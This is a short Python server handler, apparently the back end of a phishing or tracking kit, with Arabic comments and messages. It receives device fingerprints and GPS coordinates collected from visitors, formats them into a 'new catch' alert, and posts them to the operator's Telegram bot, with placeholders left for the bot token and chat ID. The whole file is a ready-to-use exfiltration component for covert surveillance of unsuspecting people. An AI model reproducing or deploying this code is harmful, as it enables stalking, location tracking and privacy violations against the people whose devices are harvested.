from http.server import BaseHTTPRequestHandler
import json
import requests

BOT_TOKEN = "ضع_توكن_البوت_هنا"
CHAT_ID = "ضع_أيدي_حسابك_هنا"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print("Error sending to telegram:", e)

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))

        action = data.get('action', 'N/A')
        dev = data.get('device', {})

        msg = f"🚨 *تنبيه صيد جديد!*\n\n"
        msg += f"📌 *الحدث:* {action}\n"
        msg += f"🌐 *IP:* `{dev.get('ip', 'N/A')}`\n"
        msg += f"🔋 *البطارية:* {dev.get('battery', 'N/A')}\n"
        msg += f"💻 *كرت الشاشة:* `{dev.get('gpu_hwid', 'N/A')}`\n"
        msg += f"📱 *النظام:* {dev.get('platform', 'N/A')}\n"
        msg += f"🖥️ *الشاشة:* {dev.get('screen', 'N/A')}\n"
        msg += f"📡 *الشبكة:* {dev.get('network', 'N/A')}\n"
        
        gps = dev.get('gps')
        if isinstance(gps, dict):
            msg += f"📍 *الموقع GPS:* https://maps.google.com/?q={gps.get('lat')},{gps.get('lon')}\n"
        else:
            msg += f"📍 *الموقع GPS:* {gps}\n"

        send_telegram(msg)

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        return
